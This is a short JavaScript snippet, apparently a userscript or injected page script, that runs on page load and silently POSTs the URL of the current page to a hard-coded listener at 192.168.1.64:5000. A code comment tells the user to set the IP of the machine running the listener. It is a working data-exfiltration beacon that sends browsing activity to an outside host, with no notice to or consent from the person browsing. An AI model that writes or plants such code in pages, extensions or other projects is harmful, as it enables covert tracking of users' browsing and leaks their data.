(function () {
  'use strict';
  // Change this to the IP of the machine running the listener.
  var TARGET_HOST = '192.168.1.64';
  var xhr = new XMLHttpRequest();
  var currentUrl = encodeURIComponent(window.location);

  xhr.open('POST', 'https://' + TARGET_HOST + ':5000/', true);
  xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');

  xhr.send('url=' + currentUrl);
}());
